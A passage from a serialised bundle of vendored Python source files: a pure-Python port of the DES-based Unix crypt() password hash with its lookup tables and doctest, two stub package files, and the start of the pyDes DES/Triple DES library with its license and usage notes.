ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY\n# OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF\n# SUCH DAMAGE.\n# \n# The licence and distribution terms for any publically available version or\n# derivative of this code cannot be changed.  i.e. this code cannot simply be\n# copied and put under another distribution licence\n# [including the GNU Public Licence.]\n#\n# ----- END fcrypt.c LICENSE -----\n\n\nimport struct, sys\n\nif sys.version_info >= (3, 0):\n    xrange = range\n\n_ITERATIONS = 16\n\n_SPtrans = (\n    # nibble 0\n    [ 0x00820200, 0x00020000, 0x80800000, 0x80820200,\n      0x00800000, 0x80020200, 0x80020000, 0x80800000,\n      0x80020200, 0x00820200, 0x00820000, 0x80000200,\n      0x80800200, 0x00800000, 0x00000000, 0x80020000,\n      0x00020000, 0x80000000, 0x00800200, 0x00020200,\n      0x80820200, 0x00820000, 0x80000200, 0x00800200,\n      0x80000000, 0x00000200, 0x00020200, 0x80820000,\n      0x00000200, 0x80800200, 0x80820000, 0x00000000,\n      0x00000000, 0x80820200, 0x00800200, 0x80020000,\n      0x00820200, 0x00020000, 0x80000200, 0x00800200,\n      0x80820000, 0x00000200, 0x00020200, 0x80800000,\n      0x80020200, 0x80000000, 0x80800000, 0x00820000,\n      0x80820200, 0x00020200, 0x00820000, 0x80800200,\n      0x00800000, 0x80000200, 0x80020000, 0x00000000,\n      0x00020000, 0x00800000, 0x80800200, 0x00820200,\n      0x80000000, 0x80820000, 0x00000200, 0x80020200 ],\n\n    # nibble 1\n    [ 0x10042004, 0x00000000, 0x00042000, 0x10040000,\n      0x10000004, 0x00002004, 0x10002000, 0x00042000,\n      0x00002000, 0x10040004, 0x00000004, 0x10002000,\n      0x00040004, 0x10042000, 0x10040000, 0x00000004,\n      0x00040000, 0x10002004, 0x10040004, 0x00002000,\n      0x00042004, 0x10000000, 0x00000000, 0x00040004,\n      0x10002004, 0x00042004, 0x10042000, 0x10000004,\n      0x10000000, 0x00040000, 0x00002004, 0x10042004,\n      0x00040004, 0x10042000, 0x10002000, 0x00042004,\n      0x10042004, 0x00040004, 0x10000004, 0x00000000,\n      0x10000000, 0x00002004, 0x00040000, 0x10040004,\n      0x00002000, 0x10000000, 0x00042004, 0x10002004,\n      0x10042000, 0x00002000, 0x00000000, 0x10000004,\n      0x00000004, 0x10042004, 0x00042000, 0x10040000,\n      0x10040004, 0x00040000, 0x00002004, 0x10002000,\n      0x10002004, 0x00000004, 0x10040000, 0x00042000 ],\n\n    # nibble 2\n    [ 0x41000000, 0x01010040, 0x00000040, 0x41000040,\n      0x40010000, 0x01000000, 0x41000040, 0x00010040,\n      0x01000040, 0x00010000, 0x01010000, 0x40000000,\n      0x41010040, 0x40000040, 0x40000000, 0x41010000,\n      0x00000000, 0x40010000, 0x01010040, 0x00000040,\n      0x40000040, 0x41010040, 0x00010000, 0x41000000,\n      0x41010000, 0x01000040, 0x40010040, 0x01010000,\n      0x00010040, 0x00000000, 0x01000000, 0x40010040,\n      0x01010040, 0x00000040, 0x40000000, 0x00010000,\n      0x40000040, 0x40010000, 0x01010000, 0x41000040,\n      0x00000000, 0x01010040, 0x00010040, 0x41010000,\n      0x40010000, 0x01000000, 0x41010040, 0x40000000,\n      0x40010040, 0x41000000, 0x01000000, 0x41010040,\n      0x00010000, 0x01000040, 0x41000040, 0x00010040,\n      0x01000040, 0x00000000, 0x41010000, 0x40000040,\n      0x41000000, 0x40010040, 0x00000040, 0x01010000 ],\n\n    # nibble 3\n    [ 0x00100402, 0x04000400, 0x00000002, 0x04100402,\n      0x00000000, 0x04100000, 0x04000402, 0x00100002,\n      0x04100400, 0x04000002, 0x04000000, 0x00000402,\n      0x04000002, 0x00100402, 0x00100000, 0x04000000,\n      0x04100002, 0x00100400, 0x00000400, 0x00000002,\n      0x00100400, 0x04000402, 0x04100000, 0x00000400,\n      0x00000402, 0x00000000, 0x00100002, 0x04100400,\n      0x04000400, 0x04100002, 0x04100402, 0x00100000,\n      0x04100002, 0x00000402, 0x00100000, 0x04000002,\n      0x00100400, 0x04000400, 0x00000002, 0x04100000,\n      0x04000402, 0x00000000, 0x00000400, 0x00100002,\n      0x00000000, 0x04100002, 0x04100400, 0x00000400,\n      0x04000000, 0x04100402, 0x00100402, 0x00100000,\n      0x04100402, 0x00000002, 0x04000400, 0x00100402,\n      0x00100002, 0x00100400, 0x04100000, 0x04000402,\n      0x00000402, 0x04000000, 0x04000002, 0x04100400 ],\n\n    # nibble 4\n    [ 0x02000000, 0x00004000, 0x00000100, 0x02004108,\n      0x02004008, 0x02000100, 0x00004108, 0x02004000,\n      0x00004000, 0x00000008, 0x02000008, 0x00004100,\n      0x02000108, 0x02004008, 0x02004100, 0x00000000,\n      0x00004100, 0x02000000, 0x00004008, 0x00000108,\n      0x02000100, 0x00004108, 0x00000000, 0x02000008,\n      0x00000008, 0x02000108, 0x02004108, 0x00004008,\n      0x02004000, 0x00000100, 0x00000108, 0x02004100,\n      0x02004100, 0x02000108, 0x00004008, 0x02004000,\n      0x00004000, 0x00000008, 0x02000008, 0x02000100,\n      0x02000000, 0x00004100, 0x02004108, 0x00000000,\n      0x00004108, 0x02000000, 0x00000100, 0x00004008,\n      0x02000108, 0x00000100, 0x00000000, 0x02004108,\n      0x02004008, 0x02004100, 0x00000108, 0x00004000,\n      0x00004100, 0x02004008, 0x02000100, 0x00000108,\n      0x00000008, 0x00004108, 0x02004000, 0x02000008 ],\n\n    # nibble 5\n    [ 0x20000010, 0x00080010, 0x00000000, 0x20080800,\n      0x00080010, 0x00000800, 0x20000810, 0x00080000,\n      0x00000810, 0x20080810, 0x00080800, 0x20000000,\n      0x20000800, 0x20000010, 0x20080000, 0x00080810,\n      0x00080000, 0x20000810, 0x20080010, 0x00000000,\n      0x00000800, 0x00000010, 0x20080800, 0x20080010,\n      0x20080810, 0x20080000, 0x20000000, 0x00000810,\n      0x00000010, 0x00080800, 0x00080810, 0x20000800,\n      0x00000810, 0x20000000, 0x20000800, 0x00080810,\n      0x20080800, 0x00080010, 0x00000000, 0x20000800,\n      0x20000000, 0x00000800, 0x20080010, 0x00080000,\n      0x00080010, 0x20080810, 0x00080800, 0x00000010,\n      0x20080810, 0x00080800, 0x00080000, 0x20000810,\n      0x20000010, 0x20080000, 0x00080810, 0x00000000,\n      0x00000800, 0x20000010, 0x20000810, 0x20080800,\n      0x20080000, 0x00000810, 0x00000010, 0x20080010 ],\n\n    # nibble 6\n    [ 0x00001000, 0x00000080, 0x00400080, 0x00400001,\n      0x00401081, 0x00001001, 0x00001080, 0x00000000,\n      0x00400000, 0x00400081, 0x00000081, 0x00401000,\n      0x00000001, 0x00401080, 0x00401000, 0x00000081,\n      0x00400081, 0x00001000, 0x00001001, 0x00401081,\n      0x00000000, 0x00400080, 0x00400001, 0x00001080,\n      0x00401001, 0x00001081, 0x00401080, 0x00000001,\n      0x00001081, 0x00401001, 0x00000080, 0x00400000,\n      0x00001081, 0x00401000, 0x00401001, 0x00000081,\n      0x00001000, 0x00000080, 0x00400000, 0x00401001,\n      0x00400081, 0x00001081, 0x00001080, 0x00000000,\n      0x00000080, 0x00400001, 0x00000001, 0x00400080,\n      0x00000000, 0x00400081, 0x00400080, 0x00001080,\n      0x00000081, 0x00001000, 0x00401081, 0x00400000,\n      0x00401080, 0x00000001, 0x00001001, 0x00401081,\n      0x00400001, 0x00401080, 0x00401000, 0x00001001 ],\n\n    # nibble 7\n    [ 0x08200020, 0x08208000, 0x00008020, 0x00000000,\n      0x08008000, 0x00200020, 0x08200000, 0x08208020,\n      0x00000020, 0x08000000, 0x00208000, 0x00008020,\n      0x00208020, 0x08008020, 0x08000020, 0x08200000,\n      0x00008000, 0x00208020, 0x00200020, 0x08008000,\n      0x08208020, 0x08000020, 0x00000000, 0x00208000,\n      0x08000000, 0x00200000, 0x08008020, 0x08200020,\n      0x00200000, 0x00008000, 0x08208000, 0x00000020,\n      0x00200000, 0x00008000, 0x08000020, 0x08208020,\n      0x00008020, 0x08000000, 0x00000000, 0x00208000,\n      0x08200020, 0x08008020, 0x08008000, 0x00200020,\n      0x08208000, 0x00000020, 0x00200020, 0x08008000,\n      0x08208020, 0x00200000, 0x08200000, 0x08000020,\n      0x00208000, 0x00008020, 0x08008020, 0x08200000,\n      0x00000020, 0x08208000, 0x00208020, 0x00000000,\n      0x08000000, 0x08200020, 0x00008000, 0x00208020 ] )\n\n_skb = (\n    # for C bits (numbered as per FIPS 46) 1 2 3 4 5 6\n    [ 0x00000000, 0x00000010, 0x20000000, 0x20000010,\n      0x00010000, 0x00010010, 0x20010000, 0x20010010,\n      0x00000800, 0x00000810, 0x20000800, 0x20000810,\n      0x00010800, 0x00010810, 0x20010800, 0x20010810,\n      0x00000020, 0x00000030, 0x20000020, 0x20000030,\n      0x00010020, 0x00010030, 0x20010020, 0x20010030,\n      0x00000820, 0x00000830, 0x20000820, 0x20000830,\n      0x00010820, 0x00010830, 0x20010820, 0x20010830,\n      0x00080000, 0x00080010, 0x20080000, 0x20080010,\n      0x00090000, 0x00090010, 0x20090000, 0x20090010,\n      0x00080800, 0x00080810, 0x20080800, 0x20080810,\n      0x00090800, 0x00090810, 0x20090800, 0x20090810,\n      0x00080020, 0x00080030, 0x20080020, 0x20080030,\n      0x00090020, 0x00090030, 0x20090020, 0x20090030,\n      0x00080820, 0x00080830, 0x20080820, 0x20080830,\n      0x00090820, 0x00090830, 0x20090820, 0x20090830 ],\n\n    # for C bits (numbered as per FIPS 46) 7 8 10 11 12 13\n    [ 0x00000000, 0x02000000, 0x00002000, 0x02002000,\n      0x00200000, 0x02200000, 0x00202000, 0x02202000,\n      0x00000004, 0x02000004, 0x00002004, 0x02002004,\n      0x00200004, 0x02200004, 0x00202004, 0x02202004,\n      0x00000400, 0x02000400, 0x00002400, 0x02002400,\n      0x00200400, 0x02200400, 0x00202400, 0x02202400,\n      0x00000404, 0x02000404, 0x00002404, 0x02002404,\n      0x00200404, 0x02200404, 0x00202404, 0x02202404,\n      0x10000000, 0x12000000, 0x10002000, 0x12002000,\n      0x10200000, 0x12200000, 0x10202000, 0x12202000,\n      0x10000004, 0x12000004, 0x10002004, 0x12002004,\n      0x10200004, 0x12200004, 0x10202004, 0x12202004,\n      0x10000400, 0x12000400, 0x10002400, 0x12002400,\n      0x10200400, 0x12200400, 0x10202400, 0x12202400,\n      0x10000404, 0x12000404, 0x10002404, 0x12002404,\n      0x10200404, 0x12200404, 0x10202404, 0x12202404 ],\n\n    # for C bits (numbered as per FIPS 46) 14 15 16 17 19 20\n    [ 0x00000000, 0x00000001, 0x00040000, 0x00040001,\n      0x01000000, 0x01000001, 0x01040000, 0x01040001,\n      0x00000002, 0x00000003, 0x00040002, 0x00040003,\n      0x01000002, 0x01000003, 0x01040002, 0x01040003,\n      0x00000200, 0x00000201, 0x00040200, 0x00040201,\n      0x01000200, 0x01000201, 0x01040200, 0x01040201,\n      0x00000202, 0x00000203, 0x00040202, 0x00040203,\n      0x01000202, 0x01000203, 0x01040202, 0x01040203,\n      0x08000000, 0x08000001, 0x08040000, 0x08040001,\n      0x09000000, 0x09000001, 0x09040000, 0x09040001,\n      0x08000002, 0x08000003, 0x08040002, 0x08040003,\n      0x09000002, 0x09000003, 0x09040002, 0x09040003,\n      0x08000200, 0x08000201, 0x08040200, 0x08040201,\n      0x09000200, 0x09000201, 0x09040200, 0x09040201,\n      0x08000202, 0x08000203, 0x08040202, 0x08040203,\n      0x09000202, 0x09000203, 0x09040202, 0x09040203 ],\n\n    # for C bits (numbered as per FIPS 46) 21 23 24 26 27 28\n    [ 0x00000000, 0x00100000, 0x00000100, 0x00100100,\n      0x00000008, 0x00100008, 0x00000108, 0x00100108,\n      0x00001000, 0x00101000, 0x00001100, 0x00101100,\n      0x00001008, 0x00101008, 0x00001108, 0x00101108,\n      0x04000000, 0x04100000, 0x04000100, 0x04100100,\n      0x04000008, 0x04100008, 0x04000108, 0x04100108,\n      0x04001000, 0x04101000, 0x04001100, 0x04101100,\n      0x04001008, 0x04101008, 0x04001108, 0x04101108,\n      0x00020000, 0x00120000, 0x00020100, 0x00120100,\n      0x00020008, 0x00120008, 0x00020108, 0x00120108,\n      0x00021000, 0x00121000, 0x00021100, 0x00121100,\n      0x00021008, 0x00121008, 0x00021108, 0x00121108,\n      0x04020000, 0x04120000, 0x04020100, 0x04120100,\n      0x04020008, 0x04120008, 0x04020108, 0x04120108,\n      0x04021000, 0x04121000, 0x04021100, 0x04121100,\n      0x04021008, 0x04121008, 0x04021108, 0x04121108 ],\n\n    # for D bits (numbered as per FIPS 46) 1 2 3 4 5 6\n    [ 0x00000000, 0x10000000, 0x00010000, 0x10010000,\n      0x00000004, 0x10000004, 0x00010004, 0x10010004,\n      0x20000000, 0x30000000, 0x20010000, 0x30010000,\n      0x20000004, 0x30000004, 0x20010004, 0x30010004,\n      0x00100000, 0x10100000, 0x00110000, 0x10110000,\n      0x00100004, 0x10100004, 0x00110004, 0x10110004,\n      0x20100000, 0x30100000, 0x20110000, 0x30110000,\n      0x20100004, 0x30100004, 0x20110004, 0x30110004,\n      0x00001000, 0x10001000, 0x00011000, 0x10011000,\n      0x00001004, 0x10001004, 0x00011004, 0x10011004,\n      0x20001000, 0x30001000, 0x20011000, 0x30011000,\n      0x20001004, 0x30001004, 0x20011004, 0x30011004,\n      0x00101000, 0x10101000, 0x00111000, 0x10111000,\n      0x00101004, 0x10101004, 0x00111004, 0x10111004,\n      0x20101000, 0x30101000, 0x20111000, 0x30111000,\n      0x20101004, 0x30101004, 0x20111004, 0x30111004 ],\n\n    # for D bits (numbered as per FIPS 46) 8 9 11 12 13 14\n    [ 0x00000000, 0x08000000, 0x00000008, 0x08000008,\n      0x00000400, 0x08000400, 0x00000408, 0x08000408,\n      0x00020000, 0x08020000, 0x00020008, 0x08020008,\n      0x00020400, 0x08020400, 0x00020408, 0x08020408,\n      0x00000001, 0x08000001, 0x00000009, 0x08000009,\n      0x00000401, 0x08000401, 0x00000409, 0x08000409,\n      0x00020001, 0x08020001, 0x00020009, 0x08020009,\n      0x00020401, 0x08020401, 0x00020409, 0x08020409,\n      0x02000000, 0x0A000000, 0x02000008, 0x0A000008,\n      0x02000400, 0x0A000400, 0x02000408, 0x0A000408,\n      0x02020000, 0x0A020000, 0x02020008, 0x0A020008,\n      0x02020400, 0x0A020400, 0x02020408, 0x0A020408,\n      0x02000001, 0x0A000001, 0x02000009, 0x0A000009,\n      0x02000401, 0x0A000401, 0x02000409, 0x0A000409,\n      0x02020001, 0x0A020001, 0x02020009, 0x0A020009,\n      0x02020401, 0x0A020401, 0x02020409, 0x0A020409 ],\n\n    # for D bits (numbered as per FIPS 46) 16 17 18 19 20 21\n    [ 0x00000000, 0x00000100, 0x00080000, 0x00080100,\n      0x01000000, 0x01000100, 0x01080000, 0x01080100,\n      0x00000010, 0x00000110, 0x00080010, 0x00080110,\n      0x01000010, 0x01000110, 0x01080010, 0x01080110,\n      0x00200000, 0x00200100, 0x00280000, 0x00280100,\n      0x01200000, 0x01200100, 0x01280000, 0x01280100,\n      0x00200010, 0x00200110, 0x00280010, 0x00280110,\n      0x01200010, 0x01200110, 0x01280010, 0x01280110,\n      0x00000200, 0x00000300, 0x00080200, 0x00080300,\n      0x01000200, 0x01000300, 0x01080200, 0x01080300,\n      0x00000210, 0x00000310, 0x00080210, 0x00080310,\n      0x01000210, 0x01000310, 0x01080210, 0x01080310,\n      0x00200200, 0x00200300, 0x00280200, 0x00280300,\n      0x01200200, 0x01200300, 0x01280200, 0x01280300,\n      0x00200210, 0x00200310, 0x00280210, 0x00280310,\n      0x01200210, 0x01200310, 0x01280210, 0x01280310 ],\n\n    # for D bits (numbered as per FIPS 46) 22 23 24 25 27 28\n    [ 0x00000000, 0x04000000, 0x00040000, 0x04040000,\n      0x00000002, 0x04000002, 0x00040002, 0x04040002,\n      0x00002000, 0x04002000, 0x00042000, 0x04042000,\n      0x00002002, 0x04002002, 0x00042002, 0x04042002,\n      0x00000020, 0x04000020, 0x00040020, 0x04040020,\n      0x00000022, 0x04000022, 0x00040022, 0x04040022,\n      0x00002020, 0x04002020, 0x00042020, 0x04042020,\n      0x00002022, 0x04002022, 0x00042022, 0x04042022,\n      0x00000800, 0x04000800, 0x00040800, 0x04040800,\n      0x00000802, 0x04000802, 0x00040802, 0x04040802,\n      0x00002800, 0x04002800, 0x00042800, 0x04042800,\n      0x00002802, 0x04002802, 0x00042802, 0x04042802,\n      0x00000820, 0x04000820, 0x00040820, 0x04040820,\n      0x00000822, 0x04000822, 0x00040822, 0x04040822,\n      0x00002820, 0x04002820, 0x00042820, 0x04042820,\n      0x00002822, 0x04002822, 0x00042822, 0x04042822 ] )\n\n_shifts2 = (0,0,1,1,1,1,1,1,0,1,1,1,1,1,1,0)\n\n_con_salt = [\n    0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,\n    0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,0xE0,0xE1,\n    0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,\n    0xEA,0xEB,0xEC,0xED,0xEE,0xEF,0xF0,0xF1,\n    0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,\n    0xFA,0xFB,0xFC,0xFD,0xFE,0xFF,0x00,0x01,\n    0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,\n    0x0A,0x0B,0x05,0x06,0x07,0x08,0x09,0x0A,\n    0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x11,0x12,\n    0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,\n    0x1B,0x1C,0x1D,0x1E,0x1F,0x20,0x21,0x22,\n    0x23,0x24,0x25,0x20,0x21,0x22,0x23,0x24,\n    0x25,0x26,0x27,0x28,0x29,0x2A,0x2B,0x2C,\n    0x2D,0x2E,0x2F,0x30,0x31,0x32,0x33,0x34,\n    0x35,0x36,0x37,0x38,0x39,0x3A,0x3B,0x3C,\n    0x3D,0x3E,0x3F,0x40,0x41,0x42,0x43,0x44 ]\n\n_cov_2char = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\n\n\ndef _HPERM_OP(a):\n    \"\"\"Clever bit manipulation.\"\"\"\n    t = ((a << 18) ^ a) & 0xcccc0000\n    return a ^ t ^ ((t >> 18) & 0x3fff)\n\ndef _PERM_OP(a,b,n,m):\n    \"\"\"Cleverer bit manipulation.\"\"\"\n    t = ((a >> n) ^ b) & m\n    b = b ^ t\n    a = a ^ (t << n)\n    return a,b\n\n\ndef _set_key(password):\n    \"\"\"Generate DES key schedule from ASCII password.\"\"\"\n\n    c,d = struct.unpack('<ii', password.encode(\"utf8\") if not isinstance(password, bytes) else password)\n    c = (c & 0x7f7f7f7f) << 1\n    d = (d & 0x7f7f7f7f) << 1\n\n    d,c = _PERM_OP(d,c,4,0x0f0f0f0f)\n    c = _HPERM_OP(c)\n    d = _HPERM_OP(d)\n    d,c = _PERM_OP(d,c,1,0x55555555)\n    c,d = _PERM_OP(c,d,8,0x00ff00ff)\n    d,c = _PERM_OP(d,c,1,0x55555555)\n\n    # Any sign-extended bits are masked off.\n    d = (((d & 0x000000ff) << 16) | (d & 0x0000ff00) |\n         ((d & 0x00ff0000) >> 16) | ((c >> 4) & 0x0f000000))\n    c = c & 0x0fffffff\n\n    # Copy globals into local variables for loop.\n    shifts2 = _shifts2\n    skbc0, skbc1, skbc2, skbc3, skbd0, skbd1, skbd2, skbd3 = _skb\n\n    k = [0] * (_ITERATIONS * 2)\n\n    for i in xrange(_ITERATIONS):\n        # Only operates on top 28 bits.\n        if shifts2[i]:\n            c = (c >> 2) | (c << 26)\n            d = (d >> 2) | (d << 26)\n        else:\n            c = (c >> 1) | (c << 27)\n            d = (d >> 1) | (d << 27)\n        c = c & 0x0fffffff\n        d = d & 0x0fffffff\n\n        s = ( skbc0[  c      & 0x3f                    ] |\n              skbc1[((c>> 6) & 0x03) | ((c>> 7) & 0x3c)] |\n              skbc2[((c>>13) & 0x0f) | ((c>>14) & 0x30)] |\n              skbc3[((c>>20) & 0x01) |\n                    ((c>>21) & 0x06) | ((c>>22) & 0x38)] )\n\n        t = ( skbd0[  d      & 0x3f                    ] |\n              skbd1[((d>> 7) & 0x03) | ((d>> 8) & 0x3c)] |\n              skbd2[((d>>15) & 0x3f)                   ] |\n              skbd3[((d>>21) & 0x0f) | ((d>>22) & 0x30)] )\n\n        k[2*i] = ((t << 16) | (s & 0x0000ffff)) & 0xffffffff\n        s = (s >> 16) | (t & 0xffff0000)\n\n        # Top bit of s may be 1.\n        s = (s << 4) | ((s >> 28) & 0x0f)\n        k[2*i + 1] = s & 0xffffffff\n\n    return k\n\n\ndef _body(ks, E0, E1):\n    \"\"\"Use the key schedule ks and salt E0, E1 to create the password hash.\"\"\"\n\n    # Copy global variable into locals for loop.\n    SP0, SP1, SP2, SP3, SP4, SP5, SP6, SP7 = _SPtrans\n\n    inner = xrange(0, _ITERATIONS*2, 2)\n    l = r = 0\n    for j in xrange(25):\n        l,r = r,l\n        for i in inner:\n            t = r ^ ((r >> 16) & 0xffff)\n            u = t & E0\n            t = t & E1\n            u = u ^ (u << 16) ^ r ^ ks[i]\n            t = t ^ (t << 16) ^ r ^ ks[i+1]\n            t = ((t >> 4) & 0x0fffffff) | (t << 28)\n\n            l,r = r,(SP1[(t    ) & 0x3f] ^ SP3[(t>> 8) & 0x3f] ^\n                     SP5[(t>>16) & 0x3f] ^ SP7[(t>>24) & 0x3f] ^\n                     SP0[(u    ) & 0x3f] ^ SP2[(u>> 8) & 0x3f] ^\n                     SP4[(u>>16) & 0x3f] ^ SP6[(u>>24) & 0x3f] ^ l)\n\n    l = ((l >> 1) & 0x7fffffff) | ((l & 0x1) << 31)\n    r = ((r >> 1) & 0x7fffffff) | ((r & 0x1) << 31)\n\n    r,l = _PERM_OP(r, l,  1, 0x55555555)\n    l,r = _PERM_OP(l, r,  8, 0x00ff00ff)\n    r,l = _PERM_OP(r, l,  2, 0x33333333)\n    l,r = _PERM_OP(l, r, 16, 0x0000ffff)\n    r,l = _PERM_OP(r, l,  4, 0x0f0f0f0f)\n\n    return l,r\n\n\ndef crypt(password, salt):\n    \"\"\"Generate an encrypted hash from the passed password.  If the password\nis longer than eight characters, only the first eight will be used.\n\nThe first two characters of the salt are used to modify the encryption\nalgorithm used to generate in the hash in one of 4096 different ways.\nThe characters for the salt should be upper- and lower-case letters A\nto Z, digits 0 to 9, '.' and '/'.\n\nThe returned hash begins with the two characters of the salt, and\nshould be passed as the salt to verify the password.\n\nExample:\n\n  >>> from fcrypt import crypt\n  >>> password = 'AlOtBsOl'\n  >>> salt = 'cE'\n  >>> hash = crypt(password, salt)\n  >>> hash\n  'cEpWz5IUCShqM'\n  >>> crypt(password, hash) == hash\n  1\n  >>> crypt('IaLaIoK', hash) == hash\n  0\n\nIn practice, you would read the password using something like the\ngetpass module, and generate the salt randomly:\n\n  >>> import random, string\n  >>> saltchars = string.ascii_letters + string.digits + './'\n  >>> salt = random.choice(saltchars) + random.choice(saltchars)\n\nNote that other ASCII characters are accepted in the salt, but the\nresults may not be the same as other versions of crypt.  In\nparticular, '_', '$1' and '$2' do not select alternative hash\nalgorithms such as the extended passwords, MD5 crypt and Blowfish\ncrypt supported by the OpenBSD C library.\n\"\"\"\n\n    # Extract the salt.\n    if len(salt) == 0:\n        salt = 'AA'\n    elif len(salt) == 1:\n        salt = salt + 'A'\n    Eswap0 = _con_salt[ord(salt[0]) & 0x7f]\n    Eswap1 = _con_salt[ord(salt[1]) & 0x7f] << 4\n\n    # Generate the key and use it to apply the encryption.\n    ks = _set_key((password + '\\0\\0\\0\\0\\0\\0\\0\\0')[:8])\n    o1, o2 = _body(ks, Eswap0, Eswap1)\n\n    # Extract 24-bit subsets of result with bytes reversed.\n    t1 = (o1 << 16 & 0xff0000) | (o1 & 0xff00) | (o1 >> 16 & 0xff)\n    t2 = (o1 >> 8 & 0xff0000) | (o2 << 8 & 0xff00) | (o2 >> 8 & 0xff)\n    t3 = (o2 & 0xff0000) | (o2 >> 16 & 0xff00)\n    # Extract 6-bit subsets.\n    r = [ t1 >> 18 & 0x3f, t1 >> 12 & 0x3f, t1 >> 6 & 0x3f, t1 & 0x3f,\n          t2 >> 18 & 0x3f, t2 >> 12 & 0x3f, t2 >> 6 & 0x3f, t2 & 0x3f,\n          t3 >> 18 & 0x3f, t3 >> 12 & 0x3f, t3 >> 6 & 0x3f ]\n    # Convert to characters.\n    for i in xrange(len(r)):\n        r[i] = _cov_2char[r[i]]\n    return salt[:2] + ''.join(r)\n\ndef _test():\n    \"\"\"Run doctest on fcrypt module.\"\"\"\n    import doctest, fcrypt\n    return doctest.testmod(fcrypt)\n\nif __name__ == '__main__':\n    _test()\n", "thirdparty/fcrypt/__init__.py": "#!/usr/bin/env python\n\n#Copyright (c) 2004, Carey Evans <careye@spamcop.net>\n#All rights reserved.\n\n#Redistribution and use in source and binary forms, with or without modification,\n#are permitted provided that the following conditions are met:\n\n#* Redistributions of source code must retain the above copyright notice,\n#this list of conditions and the following disclaimer.\n#* Redistributions in binary form must reproduce the above copyright notice,\n#this list of conditions and the following disclaimer in the documentation\n#and/or other materials provided with the distribution.\n\n#THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\n#ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n#WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n#DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR\n#ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\n#(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n#LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\n#ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n#(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\n#SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\npass\n", "thirdparty/pydes/__init__.py": "#!/usr/bin/env python\n#\n# Copyright 2009 Todd Whiteman\n#\n# This program is free software: you can redistribute it and/or modify it\n# under the terms of the GNU Lesser General Public License as published\n# by the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n\npass\n", "thirdparty/pydes/pyDes.py": "#############################################################################\n# \t\t\t\tDocumentation\t\t\t\t    #\n#############################################################################\n\n# Author:   Todd Whiteman\n# Date:     16th March, 2009\n# Version:  2.0.1\n# License:  Public Domain - free to do as you wish\n# Homepage: http://twhiteman.netfirms.com/des.html\n#\n# This is a pure python implementation of the DES encryption algorithm.\n# It's pure python to avoid portability issues, since most DES \n# implementations are programmed in C (for performance reasons).\n#\n# Triple DES class is also implemented, utilising the DES base. Triple DES\n# is either DES-EDE3 with a 24 byte key, or DES-EDE2 with a 16 byte key.\n#\n# See the README.txt that should come with this python module for the\n# implementation methods used.\n#\n# Thanks to:\n#  * David Broadwell for ideas, comments and suggestions.\n#  * Mario Wolff for pointing out and debugging some triple des CBC errors.\n#  * Santiago Palladino for providing the PKCS5 padding technique.\n#  * Shaya for correcting the PAD_PKCS5 triple des CBC errors.\n#\n\"\"\"A pure python implementation of the DES and TRIPLE DES encryption algorithms.\n\nClass initialization\n--------------------\npyDes.des(key, [mode], [IV], [pad], [padmode])\npyDes.triple_des(key, [mode], [IV], [pad], [padmode])\n\nkey     -> Bytes containing the encryption key. 8 bytes for DES, 16 or 24 bytes\n\t   for Triple DES\nmode    -> Optional argument for encryption type, can be either\n\t   pyDes.ECB (Electronic Code Book) or pyDes.CBC (Cypher Block Chaining)\nIV      -> Optional Initial Value bytes, must be supplied if using CBC mode.\n\t   Length must be 8 bytes.\npad     -> Optional argument, set the pad character (PAD_NORMAL) to use during\n\t   all encrypt/decrpt operations done with this instance.\npadmode -> Optional argument, set the padding mode (PAD_NORMAL or PAD_PKCS5)\n\t   to use during all encrypt/decrpt operations done with this instance.\n\nI recommend to use PAD_PKCS5 padding, as then you never need to worry about any\npadding issues, as the padding can be removed unambiguously upon decrypting\ndata that was encrypted using PAD_PKCS5 padmode.\n\nCommon methods\n--------------\nencrypt(data, [pad], [padmode])\ndecrypt(data, [pad], [padmode])\n\ndata    -> Bytes to be encrypted/decrypted\npad     -> Optional argument. Only when using padmode of PAD_NORMAL. For\n\t   encryption, adds this characters to the end of the data block when\n\t   data is not a multiple of 8 bytes. For decryption, will remove the\n\t   trailing characters that match this pad character from the last 8\n\t   bytes of the unencrypted data block.\npadmode -> Optional argument, set the padding mode, must be one of PAD_NORMAL\n\t   or PAD_PKCS5). Defaults to PAD_NORMAL.\n\n\nExample\n-------\nfrom pyDes import *\n\ndata = \"Please encrypt my data\"\nk = des(\"DESCRYPT\", CBC, \"\\0\\0\\0\\0\\0\\0\\0\\0\", pad=None, padmode=PAD_PKCS5)\n# For Python3, you'll need to use bytes, i.e.:\n#   data = 